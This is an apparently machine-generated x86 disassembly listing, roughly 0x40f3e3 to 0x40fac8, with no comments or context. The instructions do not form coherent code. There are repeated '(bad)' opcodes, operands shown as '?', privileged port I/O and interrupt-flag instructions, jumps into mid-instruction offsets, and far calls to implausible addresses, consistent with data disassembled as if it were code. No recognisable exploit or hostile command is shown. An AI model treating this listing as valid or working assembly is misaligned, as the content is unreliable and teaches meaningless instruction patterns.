  40f3e3:	adc    DWORD PTR [ecx-0x19],ebx
  40f3e6:	sub    al,0xf9
  40f3e8:	repnz hlt 
  40f3ea:	or     edi,0x2e1e78f5
  40f3f0:	fidiv  WORD PTR [ecx]
  40f3f2:	pop    ebx
  40f3f3:	cmp    al,0xca
  40f3f5:	nop
  40f3f6:	cmp    eax,0xc98f4e77
  40f3fb:	test   DWORD PTR [ebx],ebx
  40f3fd:	inc    ecx
  40f3fe:	jne    0x40f3ef
  40f400:	ds sub edi,eax
  40f403:	xor    ecx,DWORD PTR [esi-0x64]
  40f406:	push   esp
  40f407:	cmp    edx,0xffffffe7
  40f40a:	in     al,0x93
  40f40c:	mov    dl,0x72
  40f40e:	test   al,bh
  40f410:	xchg   ebx,eax
  40f411:	out    dx,al
  40f412:	dec    edi
  40f413:	push   0xc2af453e
  40f418:	js     0x40f474
  40f41a:	aas    
  40f41b:	mov    ds:0x7e70e7e3,al
  40f420:	push   ss
  40f421:	sub    DWORD PTR [ecx+0x46],ebp
  40f424:	mov    dl,0xc2
  40f426:	arpl   bx,di
  40f428:	mov    ebp,ecx
  40f42a:	pop    ebx
  40f42b:	xor    al,0x91
  40f42d:	xor    DWORD PTR [edi-0x3362f96b],esp
  40f433:	test   cl,ah
  40f435:	adc    cl,bh
  40f437:	adc    al,0x38
  40f439:	push   DWORD PTR [edx-0x7c138116]
  40f43f:	mov    BYTE PTR [ecx],al
  40f441:	fadd   DWORD PTR [ebx]
  40f443:	mov    dl,0xc
  40f445:	adc    DWORD PTR [ebx-0x7f],ebx
  40f448:	les    edi,FWORD PTR [ebp-0x50]
  40f44b:	fwait
  40f44c:	(bad)  
  40f44d:	lods   eax,DWORD PTR ds:[esi]
  40f44e:	shr    DWORD PTR ds:[edi-0x51],cl
  40f452:	jmp    0x40f4af
  40f454:	jne    0x40f3f2
  40f456:	pop    edi
  40f457:	and    BYTE PTR [esi],dl
  40f459:	data16 xor al,0x5c
  40f45c:	add    DWORD PTR [edx],0x8dea8187
  40f462:	add    DWORD PTR [ebp-0x35c3889e],0xfdf34ce2
  40f46c:	sahf   
  40f46d:	xchg   ecx,eax
  40f46e:	pop    ebx
  40f46f:	pusha  
  40f470:	push   ss
  40f471:	sti    
  40f472:	arpl   dx,ax
  40f474:	sbb    al,0xdc
  40f476:	loope  0x40f3fc
  40f478:	leave  
  40f479:	aam    0x35
  40f47b:	cmp    eax,0x76d58b3f
  40f480:	or     ebp,ebx
  40f482:	ror    BYTE PTR [edx+eax*2+0x2bba58e6],cl
  40f489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f48a:	cs in  eax,dx
  40f48c:	jne    0x40f42b
  40f48e:	out    0xb9,al
  40f490:	fwait
  40f491:	jmp    0xf8da88f1
  40f496:	and    eax,0x92e6a7a3
  40f49b:	push   ecx
  40f49c:	mov    bl,0xb7
  40f49e:	push   ebx
  40f49f:	jae    0x40f430
  40f4a1:	sub    eax,0x55a191b2
  40f4a6:	pop    edx
  40f4a7:	(bad)  
  40f4a8:	in     eax,dx
  40f4a9:	jbe    0x40f483
  40f4ab:	cld    
  40f4ac:	stos   BYTE PTR es:[edi],al
  40f4ad:	in     al,0xcc
  40f4af:	add    DWORD PTR [ebp-0x224452a5],0x4e
  40f4b6:	pop    edx
  40f4b7:	push   ebx
  40f4b8:	pop    ebp
  40f4b9:	sbb    al,0x54
  40f4bb:	mov    bl,BYTE PTR [esi]
  40f4bd:	aaa    
  40f4be:	xor    dh,al
  40f4c0:	(bad)  
  40f4c2:	mov    dl,0x98
  40f4c4:	(bad)  
  40f4c6:	pop    esi
  40f4c7:	adc    al,0xba
  40f4c9:	push   es
  40f4ca:	xchg   esp,eax
  40f4cb:	inc    esi
  40f4cc:	mov    ecx,DWORD PTR [ebp+0x6625405b]
  40f4d2:	xchg   esp,eax
  40f4d3:	or     eax,0x8414ecb2
  40f4d8:	pushf  
  40f4d9:	push   0x373f6111
  40f4de:	sbb    eax,0x2491ad6a
  40f4e3:	push   DWORD PTR [eax-0xc]
  40f4e6:	push   0x36
  40f4e8:	mov    cl,dl
  40f4ea:	scas   eax,DWORD PTR es:[edi]
  40f4eb:	mov    ds:0x2c5a67fc,al
  40f4f0:	ds xchg ebp,eax
  40f4f2:	push   eax
  40f4f3:	je     0x40f570
  40f4f5:	aam    0x2b
  40f4f7:	inc    esi
  40f4f8:	popa   
  40f4f9:	out    0xaa,al
  40f4fb:	dec    ecx
  40f4fc:	fiadd  WORD PTR [eax-0x37]
  40f4ff:	call   0x57f8c1e7
  40f504:	push   esp
  40f505:	pop    ebp
  40f506:	pop    ebx
  40f507:	sub    BYTE PTR [edx-0x3f],dh
  40f50a:	or     BYTE PTR [ebp+0x4e],bl
  40f50d:	add    DWORD PTR [edi],edi
  40f50f:	xchg   dh,dl
  40f511:	test   BYTE PTR [esi+0x5e],ch
  40f514:	sbb    ebp,DWORD PTR [edi]
  40f516:	popa   
  40f517:	pop    es
  40f518:	push   es
  40f519:	sub    DWORD PTR [eax],edi
  40f51b:	inc    ecx
  40f51c:	mov    esi,0x2d0df20a
  40f521:	cmc    
  40f522:	in     eax,dx
  40f523:	(bad)  
  40f524:	push   esp
  40f525:	iret   
  40f526:	mov    bl,0x84
  40f528:	popf   
  40f529:	xchg   esp,eax
  40f52a:	(bad)  
  40f52b:	push   esi
  40f52c:	ds pop es
  40f52e:	or     BYTE PTR [eax-0x4e8588f1],dh
  40f534:	push   eax
  40f535:	out    0x52,eax
  40f537:	push   0xe43681b8
  40f53c:	xchg   esp,eax
  40f53d:	bound  ecx,QWORD PTR [eax+0x5fb39bf5]
  40f543:	bound  ebx,QWORD PTR [ecx]
  40f545:	daa    
  40f546:	ret    
  40f547:	stos   BYTE PTR es:[edi],al
  40f548:	xchg   edx,eax
  40f549:	stc    
  40f54a:	into   
  40f54b:	xchg   esp,eax
  40f54c:	outs   dx,DWORD PTR ds:[esi]
  40f54d:	cmp    eax,0x6a8f2a10
  40f552:	pop    ebx
  40f553:	xor    eax,DWORD PTR [esi]
  40f555:	fstp   st(5)
  40f557:	fdivr  DWORD PTR [edi-0x2088e4ce]
  40f55d:	mov    al,0x6
  40f55f:	mov    ecx,0x84087960
  40f564:	(bad)  
  40f565:	imul   ebp,DWORD PTR [esi],0x41
  40f568:	cmp    BYTE PTR [edi+0x245527c],dh
  40f56e:	cmc    
  40f56f:	in     al,dx
  40f570:	outs   dx,DWORD PTR ds:[esi]
  40f571:	stos   BYTE PTR es:[edi],al
  40f572:	stos   BYTE PTR es:[edi],al
  40f573:	in     eax,0xc4
  40f575:	sub    BYTE PTR [ecx-0x7b],bh
  40f578:	and    DWORD PTR [esi+edx*8+0x77],edx
  40f57c:	ds loope 0x40f57a
  40f57f:	stos   BYTE PTR es:[edi],al
  40f580:	fimul  WORD PTR [esi+0x22]
  40f583:	pop    ebx
  40f584:	ja     0x40f56c
  40f586:	cs inc ebx
  40f588:	or     ebp,edx
  40f58a:	xchg   esp,eax
  40f58b:	cli    
  40f58c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f58d:	push   cs
  40f58e:	xchg   edx,eax
  40f58f:	push   ds
  40f590:	or     al,0xe7
  40f592:	fisub  WORD PTR es:[edi]
  40f595:	repz mov eax,0x5ee7788a
  40f59b:	(bad)  
  40f59c:	data16 sub dl,ah
  40f59f:	out    dx,al
  40f5a0:	pushf  
  40f5a1:	adc    al,0x1f
  40f5a3:	ins    DWORD PTR es:[edi],dx
  40f5a4:	cmp    ebx,edi
  40f5a6:	mov    dl,0x68
  40f5a8:	test   al,0x87
  40f5aa:	mov    ah,0xc5
  40f5ac:	inc    ebx
  40f5ad:	cld    
  40f5ae:	mov    al,0x34
  40f5b0:	push   0xffffff94
  40f5b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5b3:	icebp  
  40f5b4:	mov    ?,ebx
  40f5b6:	pop    edx
  40f5b7:	icebp  
  40f5b8:	inc    edi
  40f5b9:	mov    BYTE PTR [ebx],cl
  40f5bb:	jbe    0x40f550
  40f5bd:	fcomp  DWORD PTR [ebx+0x6]
  40f5c0:	xchg   esi,eax
  40f5c1:	ja     0x40f55e
  40f5c3:	add    BYTE PTR [edx+0x44],al
  40f5c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5c7:	test   BYTE PTR [ebx],dl
  40f5c9:	xchg   ecx,eax
  40f5ca:	outs   dx,BYTE PTR ds:[esi]
  40f5cb:	test   DWORD PTR [esi],edi
  40f5cd:	dec    ecx
  40f5ce:	lods   eax,DWORD PTR ds:[esi]
  40f5cf:	xchg   esp,eax
  40f5d0:	ins    DWORD PTR es:[edi],dx
  40f5d1:	jne    0x40f5bc
  40f5d3:	add    dl,BYTE PTR [edx-0x27319de2]
  40f5d9:	sar    DWORD PTR [eax],1
  40f5db:	test   ebx,esi
  40f5dd:	test   al,0x2b
  40f5df:	dec    edi
  40f5e0:	aas    
  40f5e1:	not    DWORD PTR [ebx+0x39]
  40f5e4:	xor    dh,ah
  40f5e6:	cmp    eax,0x5ee583cb
  40f5eb:	mov    ecx,0x3d4c914d
  40f5f0:	adc    al,0x7e
  40f5f2:	sbb    eax,0x410b3f2f
  40f5f7:	mov    ch,0xc4
  40f5fa:	test   DWORD PTR [eax-0x44],ecx
  40f5fd:	fsubr  st(6),st
  40f5ff:	fcomp  st(2)
  40f601:	addr16 ss jne 0x40f628
  40f605:	xor    eax,0x9cc7dd17
  40f60a:	xchg   ecx,eax
  40f60b:	pop    esp
  40f60c:	nop
  40f60d:	sbb    DWORD PTR [eax+0x46],edx
  40f610:	ds pop esi
  40f612:	ja     0x40f67a
  40f614:	sbb    DWORD PTR [ebx],ebx
  40f616:	loopne 0x40f5e5
  40f618:	adc    BYTE PTR [ebx+0xa5848a],al
  40f61e:	sbb    edx,DWORD PTR [ebx+esi*2]
  40f621:	and    DWORD PTR [ebp-0xd1ebfee],0xffffffe4
  40f628:	jo     0x40f5b3
  40f62a:	(bad)  
  40f62b:	mov    ah,0xe6
  40f62d:	jbe    0x40f5de
  40f62f:	xchg   BYTE PTR [edi-0x7b],dl
  40f632:	in     al,0xf7
  40f634:	lods   eax,DWORD PTR ds:[esi]
  40f635:	lock mov ecx,0x21e76b4c
  40f63b:	sahf   
  40f63c:	fwait
  40f63d:	int    0x7
  40f63f:	xchg   bh,bh
  40f641:	out    0x42,al
  40f643:	xor    esi,DWORD PTR [ecx+0x57]
  40f646:	cmp    al,0xc6
  40f648:	push   es
  40f649:	cmp    al,0xd5
  40f64b:	mov    cl,0xbe
  40f64d:	mov    esi,0xa822625b
  40f652:	mov    DWORD PTR [edi],ecx
  40f654:	cli    
  40f655:	jae    0x40f69b
  40f657:	test   edi,esp
  40f659:	push   edx
  40f65a:	cli    
  40f65b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f65c:	xor    DWORD PTR [ebp+0x26],eax
  40f65f:	push   ss
  40f660:	xchg   edx,eax
  40f661:	push   esi
  40f662:	jno    0x40f63a
  40f664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f665:	xchg   esi,eax
  40f666:	out    0x8a,eax
  40f668:	push   es
  40f669:	(bad)  
  40f66a:	mov    ecx,0x8ae7a5e3
  40f66f:	outs   dx,DWORD PTR ds:[esi]
  40f670:	cmp    BYTE PTR [eax-0x65],dl
  40f673:	(bad)  
  40f674:	iret   
  40f675:	inc    ebp
  40f676:	mov    DWORD PTR [ebx],0xda5b8db6
  40f67c:	fs dec eax
  40f67e:	sbb    esi,DWORD PTR [edi]
  40f680:	and    BYTE PTR [esi-0x4a],ah
  40f683:	test   DWORD PTR [eax-0x15],esi
  40f686:	out    dx,al
  40f687:	jp     0x40f69a
  40f689:	data16 ins BYTE PTR es:[edi],dx
  40f68b:	nop
  40f68c:	dec    ebp
  40f68d:	cwde   
  40f68e:	xchg   esp,eax
  40f68f:	jmp    0x40f6d0
  40f691:	adc    DWORD PTR [edx+0xbf93d26],edi
  40f697:	cmp    eax,0x8c9625f
  40f69c:	sub    ebp,DWORD PTR [edi+0x5b]
  40f69f:	sub    BYTE PTR [esi-0x2556da93],bl
  40f6a5:	or     cl,BYTE PTR [esi]
  40f6a7:	test   DWORD PTR [esi],esp
  40f6a9:	pop    esi
  40f6aa:	pop    eax
  40f6ab:	in     eax,dx
  40f6ac:	aas    
  40f6ad:	ret    
  40f6ae:	jae    0x40f657
  40f6b0:	sahf   
  40f6b1:	sub    al,0x26
  40f6b3:	fs addr16 inc ah
  40f6b7:	lahf   
  40f6b8:	aam    0x54
  40f6ba:	jmp    0xc144:0x261bdd86
  40f6c1:	sub    ebx,DWORD PTR [ebx-0x26]
  40f6c4:	add    al,0x86
  40f6c6:	and    ah,BYTE PTR [edi]
  40f6c8:	xor    al,0xc3
  40f6ca:	xchg   edi,eax
  40f6cb:	test   BYTE PTR [esi-0x26],bh
  40f6ce:	push   ds
  40f6cf:	dec    esi
  40f6d0:	xor    BYTE PTR [ecx],al
  40f6d2:	mov    bl,0xe1
  40f6d4:	add    DWORD PTR ds:0x798d6637,ebx
  40f6da:	sbb    eax,edx
  40f6dc:	bound  ebx,QWORD PTR [esi]
  40f6de:	mov    ebx,0x125f0985
  40f6e3:	cmp    edi,DWORD PTR [edi]
  40f6e5:	cmc    
  40f6e6:	loope  0x40f6dd
  40f6e8:	lods   eax,DWORD PTR ds:[esi]
  40f6e9:	xchg   esp,eax
  40f6ea:	(bad)  
  40f6eb:	retf   
  40f6ec:	add    eax,0x282448e6
  40f6f1:	loopne 0x40f71f
  40f6f3:	inc    esi
  40f6f4:	in     eax,dx
  40f6f5:	shl    DWORD PTR [ebp+0x649340c9],cl
  40f6fb:	lods   al,BYTE PTR ds:[esi]
  40f6fc:	scas   eax,DWORD PTR es:[edi]
  40f6fd:	out    0xa6,eax
  40f6ff:	dec    DWORD PTR [esi]
  40f701:	xchg   edi,eax
  40f702:	aaa    
  40f703:	sub    DWORD PTR [ecx-0x1a],esi
  40f706:	jmp    0x61bb:0xf3ca6534
  40f70d:	pop    ecx
  40f70e:	sbb    eax,0x5b9b37e0
  40f713:	mov    dh,0xcc
  40f715:	imul   esi,DWORD PTR [edi],0x39
  40f718:	jp     0x40f6d5
  40f71a:	outs   dx,BYTE PTR ds:[esi]
  40f71b:	test   DWORD PTR [esi-0x39cb3cb2],ebx
  40f721:	sti    
  40f722:	jo     0x40f78a
  40f724:	push   ebx
  40f725:	ds pop ecx
  40f727:	mov    BYTE PTR [ebx+0x6262807a],ch
  40f72d:	out    0x1a,al
  40f72f:	test   al,0x13
  40f731:	in     al,dx
  40f732:	mov    ah,0xbb
  40f734:	jmp    0x40f6ec
  40f736:	jecxz  0x40f6f5
  40f738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f739:	pop    esi
  40f73a:	and    edx,eax
  40f73c:	add    al,0xad
  40f73e:	adc    DWORD PTR [edi+0x31],ebp
  40f741:	shr    BYTE PTR [edi+eiz*1+0x5d261d9],0x9f
  40f749:	fxch   st(3)
  40f74b:	add    eax,0x85a5d2aa
  40f750:	fiadd  DWORD PTR [edi+0x233f9be7]
  40f756:	std    
  40f757:	jle    0x40f77a
  40f759:	or     dh,BYTE PTR [edx+0x2e]
  40f75c:	imul   esp,edi,0x60
  40f75f:	stos   DWORD PTR es:[edi],eax
  40f760:	sbb    al,0x99
  40f762:	rol    eax,0x89
  40f765:	adc    BYTE PTR [eax],0xe8
  40f768:	lock dec esp
  40f76a:	pop    edx
  40f76b:	retf   0x2647
  40f76e:	test   BYTE PTR [ecx-0x7b52dc3e],bl
  40f774:	xchg   edi,eax
  40f775:	(bad)  
  40f776:	fcom   DWORD PTR [edi]
  40f778:	ds push ecx
  40f77a:	cdq    
  40f77b:	jmp    0x4afa8b19
  40f780:	adc    esp,esi
  40f782:	push   eax
  40f783:	ret    0x4983
  40f786:	(bad)  
  40f788:	rcr    DWORD PTR [ebp-0x6f70a0f8],1
  40f78e:	pop    edx
  40f78f:	dec    esi
  40f790:	and    DWORD PTR [edi],ecx
  40f792:	cmp    dl,BYTE PTR [edi+0x5132e685]
  40f798:	mov    bh,0xaf
  40f79a:	fmul   DWORD PTR [edx-0x4078444b]
  40f7a0:	dec    esp
  40f7a1:	cdq    
  40f7a2:	inc    ebp
  40f7a3:	pushf  
  40f7a4:	fisub  WORD PTR [esi-0x7a3a24d0]
  40f7aa:	and    DWORD PTR [edx-0x7b008048],esp
  40f7b0:	outs   dx,BYTE PTR ds:[esi]
  40f7b1:	enter  0xcf76,0x3f
  40f7b5:	cmp    DWORD PTR [ebx+0x6eaeadda],ebx
  40f7bb:	sub    al,0x7a
  40f7bd:	lahf   
  40f7be:	mov    dl,0xd6
  40f7c0:	aas    
  40f7c1:	pop    es
  40f7c2:	pop    ebx
  40f7c3:	xor    esi,ecx
  40f7c5:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40f7c7:	mov    edi,DWORD PTR [esi]
  40f7c9:	shl    DWORD PTR [ebp+0x5f],cl
  40f7cc:	add    eax,0x489a4866
  40f7d1:	in     eax,0xc8
  40f7d3:	adc    DWORD PTR ds:0x279732,0x18
  40f7da:	jns    0x40f836
  40f7dc:	(bad)  
  40f7dd:	repnz call 0x458e:0x5afefb25
  40f7e5:	cmc    
  40f7e6:	sub    dh,BYTE PTR [edx+0x5a]
  40f7e9:	sti    
  40f7ea:	sbb    eax,0xd12b2385
  40f7ef:	js     0x40f821
  40f7f1:	(bad)  
  40f7f2:	or     al,0xa2
  40f7f4:	out    0x66,eax
  40f7f6:	xlat   BYTE PTR ds:[ebx]
  40f7f7:	lods   eax,DWORD PTR ds:[esi]
  40f7f8:	xchg   ebx,eax
  40f7f9:	out    0x47,al
  40f7fb:	pop    ecx
  40f7fc:	mov    BYTE PTR [edi],ah
  40f7fe:	ret    
  40f7ff:	xchg   edx,eax
  40f800:	mov    BYTE PTR ds:[ebx+edi*4+0x25],al
  40f805:	(bad)  
  40f806:	or     BYTE PTR [esi+eax*8],al
  40f809:	out    dx,al
  40f80a:	jbe    0x40f87f
  40f80c:	inc    ecx
  40f80d:	jge    0x40f869
  40f80f:	mov    al,ds:0x89f2875
  40f814:	cmp    BYTE PTR [ebx],0x68
  40f817:	sbb    cl,0xf5
  40f81a:	fbstp  TBYTE PTR [edi+0x7ca61c0]
  40f820:	cdq    
  40f821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f822:	pop    edx
  40f823:	(bad)  
  40f824:	dec    ebx
  40f825:	mov    ds:0x722a6a41,eax
  40f82a:	int    0xfd
  40f82c:	out    dx,eax
  40f82d:	neg    BYTE PTR [ebx-0x3a]
  40f830:	adc    eax,0x2a246fdd
  40f835:	fstp   QWORD PTR [edx+0x22]
  40f838:	cmc    
  40f839:	inc    edx
  40f83a:	mov    ch,0x5f
  40f83c:	sbb    BYTE PTR [eax],cl
  40f83e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f83f:	(bad)  
  40f840:	mov    ch,0xe8
  40f842:	mov    cl,0x2d
  40f844:	xchg   edx,eax
  40f845:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f846:	jp     0x40f84c
  40f848:	ds jno 0x40f7ec
  40f84b:	dec    eax
  40f84c:	xchg   esp,eax
  40f84d:	iret   
  40f84e:	rol    BYTE PTR [ebp-0x62],0xe1
  40f852:	jle    0x40f887
  40f854:	push   ecx
  40f855:	add    al,0x7d
  40f857:	sahf   
  40f858:	(bad)  
  40f859:	ins    BYTE PTR es:[edi],dx
  40f85a:	add    al,0x57
  40f85c:	aas    
  40f85d:	loope  0x40f893
  40f85f:	pop    esp
  40f860:	mov    eax,ds:0xe83a3ff1
  40f865:	out    0x98,al
  40f867:	mov    bh,0x29
  40f869:	test   eax,0xb9f0c6c2
  40f86e:	ins    BYTE PTR es:[edi],dx
  40f86f:	xor    DWORD PTR [ebx-0x17],esi
  40f872:	pop    ebx
  40f873:	mov    esi,0x7e237073
  40f878:	stos   BYTE PTR es:[edi],al
  40f879:	add    DWORD PTR [ebx-0x7e],edx
  40f87c:	push   eax
  40f87d:	loopne 0x40f817
  40f87f:	ins    DWORD PTR es:[edi],dx
  40f880:	popa   
  40f881:	daa    
  40f882:	cdq    
  40f883:	xlat   BYTE PTR ds:[ebx]
  40f884:	aas    
  40f885:	dec    ecx
  40f886:	mov    BYTE PTR [esi+0x7ed1de26],ah
  40f88c:	inc    ecx
  40f88d:	out    0xa6,eax
  40f88f:	mov    bh,0xaf
  40f891:	jg     0x40f8d9
  40f893:	adc    edx,esi
  40f895:	or     DWORD PTR [edx],edx
  40f897:	mov    BYTE PTR ds:0xda90595a,dh
  40f89d:	mov    gs,esp
  40f89f:	push   ds
  40f8a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8a1:	mov    esi,0xe69947d2
  40f8a6:	in     al,0x2c
  40f8a8:	jae    0x40f85f
  40f8aa:	jle    0x40f87b
  40f8ac:	rol    edx,cl
  40f8ae:	lock dec eax
  40f8b0:	mov    DWORD PTR [edx+0x5e5465b],esi
  40f8b6:	inc    eax
  40f8b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8b8:	push   es
  40f8b9:	mov    ebx,0xf512840e
  40f8be:	dec    eax
  40f8bf:	cmc    
  40f8c0:	ds mov bh,0x66
  40f8c3:	jp     0x40f921
  40f8c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8c6:	clc    
  40f8c7:	dec    edx
  40f8c8:	xchg   edx,eax
  40f8c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8ca:	xchg   ebx,eax
  40f8cb:	call   DWORD PTR [edx-0x7]
  40f8ce:	test   al,0xb5
  40f8d0:	out    0xe9,al
  40f8d2:	jb     0x40f939
  40f8d4:	clc    
  40f8d5:	cmp    eax,0xc53f095b
  40f8da:	and    al,0xd5
  40f8dc:	or     DWORD PTR [ebx-0x18797bbc],esp
  40f8e2:	push   ss
  40f8e3:	and    DWORD PTR [edi],edx
  40f8e5:	out    dx,eax
  40f8e6:	xchg   edx,eax
  40f8e7:	imul   edi,DWORD PTR [ebx-0x2ace95f2],0xa805a6d
  40f8f1:	jl     0x40f94d
  40f8f3:	sbb    edx,DWORD PTR [edx-0x15]
  40f8f6:	and    bl,BYTE PTR [ecx-0x2869a4bb]
  40f8fc:	mov    cl,BYTE PTR [edi-0x60117ae9]
  40f902:	xor    al,0xec
  40f904:	mov    al,ds:0x585863c8
  40f909:	push   0x5d
  40f90b:	mov    ecx,0x67c0f0cf
  40f910:	mov    DWORD PTR [esi],ebp
  40f912:	jmp    0x40f94d
  40f914:	pop    esi
  40f915:	mov    al,0x29
  40f917:	xchg   DWORD PTR ds:0x280683ac,edx
  40f91d:	and    ebp,DWORD PTR [esp+eax*2+0x1e5a5eef]
  40f924:	fsubr  st(4),st
  40f926:	push   esp
  40f927:	enter  0x98ce,0x72
  40f92b:	test   BYTE PTR [edi],bl
  40f92d:	adc    DWORD PTR [esi-0x19],0x628450cb
  40f934:	jno    0x40f944
  40f936:	and    ch,BYTE PTR [edx]
  40f938:	adc    dh,BYTE PTR [ebx+ebx*2]
  40f93b:	fimul  DWORD PTR [edi]
  40f93d:	cli    
  40f93e:	push   eax
  40f93f:	iret   
  40f940:	retf   0xf8e6
  40f943:	jge    0x40f8f7
  40f945:	push   cs
  40f946:	jecxz  0x40f908
  40f948:	sub    ecx,DWORD PTR [ebp+0x13]
  40f94b:	scas   eax,DWORD PTR es:[edi]
  40f94c:	pop    edx
  40f94d:	push   0x50
  40f94f:	in     al,0xbe
  40f951:	div    BYTE PTR [ebp+0x141ad407]
  40f957:	mov    al,0xfe
  40f959:	(bad)  
  40f95a:	pop    eax
  40f95b:	test   ebx,ecx
  40f95d:	mov    bl,0xd6
  40f95f:	add    eax,DWORD PTR [esi-0xbae5d97]
  40f965:	pop    edi
  40f966:	in     eax,0x98
  40f968:	push   ebp
  40f969:	cmp    eax,0xe77d44e1
  40f96e:	xor    bl,ch
  40f970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f971:	js     0x40f9ae
  40f973:	push   ds
  40f974:	leave  
  40f975:	mov    edx,0xdf265196
  40f97a:	pop    ebx
  40f97b:	push   0x2174fde0
  40f980:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f981:	adc    esp,DWORD PTR [esi-0x75]
  40f984:	inc    ecx
  40f985:	int    0x98
  40f987:	push   edi
  40f988:	mov    eax,DWORD PTR [edx+0x258e05bf]
  40f98e:	ds loop 0x40f9d1
  40f991:	jb     0x40f99d
  40f993:	test   BYTE PTR [edx+0xe],dh
  40f996:	xchg   edi,eax
  40f997:	pop    ss
  40f998:	push   edx
  40f999:	xor    DWORD PTR [ecx-0x4592317c],eax
  40f99f:	std    
  40f9a0:	aas    
  40f9a1:	dec    ebx
  40f9a2:	jo     0x40fa0b
  40f9a4:	test   al,0x2
  40f9a6:	mov    BYTE PTR [eax-0x48],dl
  40f9a9:	(bad)  
  40f9aa:	xor    esi,DWORD PTR [eax-0x69]
  40f9ad:	in     al,0x58
  40f9af:	jno    0x40f982
  40f9b1:	pop    ss
  40f9b2:	or     ch,BYTE PTR [ebx]
  40f9b4:	add    al,0xe
  40f9b6:	push   ebp
  40f9b7:	dec    eax
  40f9b8:	and    bl,ah
  40f9ba:	mov    ds:0x5f670165,al
  40f9bf:	adc    eax,0xc612fa8f
  40f9c4:	mov    al,ds:0x2a8541da
  40f9c9:	ret    0xe249
  40f9cc:	ds repz mov edx,0xc8bf319e
  40f9d3:	es xchg ebx,eax
  40f9d5:	jecxz  0x40f9fd
  40f9d7:	popa   
  40f9d8:	sti    
  40f9d9:	ret    
  40f9da:	lock xchg esi,eax
  40f9dc:	ds (bad) 
  40f9de:	push   ebp
  40f9df:	sti    
  40f9e0:	cmc    
  40f9e1:	xchg   edi,eax
  40f9e2:	ss (bad) 
  40f9e4:	retf   0x2de4
  40f9e7:	data16 ins BYTE PTR es:[edi],dx
  40f9e9:	out    dx,al
  40f9ea:	data16 mov es,WORD PTR [eax+0x67]
  40f9ee:	sti    
  40f9ef:	jmp    0xe6c65c12
  40f9f4:	mov    WORD PTR ds:0x3c62ea5a,?
  40f9fa:	stc    
  40f9fb:	mov    cl,0xce
  40f9fd:	test   DWORD PTR [ecx],0x20d9884
  40fa03:	mov    bh,BYTE PTR [edi]
  40fa05:	inc    ebx
  40fa06:	ss scas eax,DWORD PTR es:[edi]
  40fa08:	jns    0x40fa3c
  40fa0a:	mov    ebx,esi
  40fa0c:	xchg   bh,ah
  40fa0e:	push   cs
  40fa0f:	jg     0x40fa85
  40fa11:	add    BYTE PTR [edx-0x10560de8],ah
  40fa17:	fsub   DWORD PTR [edx]
  40fa19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa1a:	pop    eax
  40fa1b:	mov    dl,0x1b
  40fa1d:	or     bl,ah
  40fa1f:	mul    DWORD PTR [edi]
  40fa21:	out    0x92,al
  40fa23:	sub    DWORD PTR [ebx+0x56],ebx
  40fa26:	fwait
  40fa27:	dec    esp
  40fa28:	xor    BYTE PTR [esi],dl
  40fa2a:	test   eax,0x5ae9c221
  40fa2f:	rol    BYTE PTR [esi],cl
  40fa31:	jnp    0x40fa4c
  40fa33:	add    ah,BYTE PTR [esi+0x166514e7]
  40fa39:	aas    
  40fa3a:	jns    0x40fa43
  40fa3c:	test   eax,0x36f36baf
  40fa41:	mov    al,BYTE PTR [edx+ecx*1+0x57]
  40fa45:	mov    bl,0xb2
  40fa47:	add    al,0x1
  40fa49:	out    0x34,al
  40fa4b:	push   ds
  40fa4c:	pop    esi
  40fa4d:	and    DWORD PTR [ebp-0x38803980],eax
  40fa53:	inc    ecx
  40fa54:	(bad)  
  40fa55:	stc    
  40fa56:	pop    ebx
  40fa57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa58:	push   edi
  40fa59:	ins    DWORD PTR es:[edi],dx
  40fa5a:	push   0xe2aff40c
  40fa5f:	pusha  
  40fa60:	mov    dl,0xe6
  40fa62:	cwde   
  40fa63:	out    0x26,eax
  40fa65:	xchg   edx,eax
  40fa66:	push   edx
  40fa67:	jmp    0x40faa2
  40fa69:	test   eax,0x1d3749b0
  40fa6e:	(bad)  
  40fa6f:	mov    edx,0x47e53235
  40fa74:	mov    ebp,eax
  40fa76:	loop   0x40fae1
  40fa78:	xor    dl,BYTE PTR [edi+0x4]
  40fa7b:	in     al,dx
  40fa7c:	dec    esp
  40fa7d:	push   ss
  40fa7e:	je     0x40fa25
  40fa80:	aas    
  40fa81:	out    0xcd,eax
  40fa83:	mov    ebp,0x5c9cff67
  40fa88:	or     ah,dh
  40fa8a:	mov    esi,0x6ca20967
  40fa8f:	mov    ?,WORD PTR [eax]
  40fa91:	das    
  40fa92:	cwde   
  40fa93:	add    DWORD PTR [eax-0x7],eax
  40fa96:	pop    ebx
  40fa97:	mov    WORD PTR [edi],es
  40fa99:	mov    BYTE PTR [ecx-0x49],bh
  40fa9c:	adc    DWORD PTR es:[edx-0x37],ebp
  40faa0:	push   0xb485a604
  40faa5:	jl     0x40facc
  40faa7:	sub    eax,0xd0021291
  40faac:	rol    ch,cl
  40faae:	pop    ebp
  40faaf:	les    ecx,FWORD PTR [edi]
  40fab1:	pop    ebx
  40fab2:	das    
  40fab3:	gs cli 
  40fab5:	sar    BYTE PTR ds:0x43363f84,1
  40fabb:	adc    eax,0x204ab13e
  40fac0:	cmp    ecx,ebx
  40fac2:	push   eax
  40fac3:	imul   esp,DWORD PTR [edx],0x46
  40fac6:	aam    0xed
  40fac8:	sub    esi,esp
